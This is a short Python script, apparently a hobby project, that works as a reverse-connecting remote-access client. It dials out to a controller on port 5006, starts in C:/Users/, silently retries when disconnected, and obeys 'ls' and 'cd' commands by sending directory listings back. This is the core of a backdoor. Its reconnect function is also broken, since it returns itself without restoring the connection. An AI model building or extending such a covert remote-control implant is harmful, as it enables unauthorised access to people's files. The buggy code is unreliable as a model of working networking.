#!/usr/bin/env python

import socket
import os
import pickle
import time
import pip

TCP_IP = '127.0.0.1'
TCP_PORT = 5006
BUFFER_SIZE = 20  # Normally 1024, but we want fast response
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.connect((TCP_IP, TCP_PORT))
os.chdir("C:/Users/")
def reconnect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.connect((TCP_IP, TCP_PORT))
    conn = s
    return reconnect

conn = s
while 1:
    try:
        conn.settimeout(15)
        dataraw = conn.recv(BUFFER_SIZE).decode()
        data = dataraw.split()
    except:
        s.close()
        connected = False
        while connected == False:
            time.sleep(1)
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.connect((TCP_IP, TCP_PORT))
                conn = s
                connected = True
                print("Woohoo Connection has been restored!")
                conn.settimeout(15)
                dataraw = conn.recv(BUFFER_SIZE).decode()
                data = dataraw.split()
            except:
                s.close()
                print("Retrying connection..")

    if not data: 
        print("thats nothing") 
        conn.close() 
        reconnect()
    try:
        print(data)
    except:
        print("")
    if data[0] == "ls":
        if len(data) == 2:
            thlst = os.listdir(data[1])
            conn.send(' '.join(thlst).encode())
        else:
            thlst = os.listdir(os.getcwd())
            conn.send(" ".join(thlst).encode())
    elif data[0] == "cd":
        if len(data) == 2:
            try:
                os.chdir(data[1])
                conn.send(("Successful! Path is now" + os.getcwd()).encode())
            except:
                conn.send("Unsuccessful! Path doesnt exist or something".encode())

conn.close()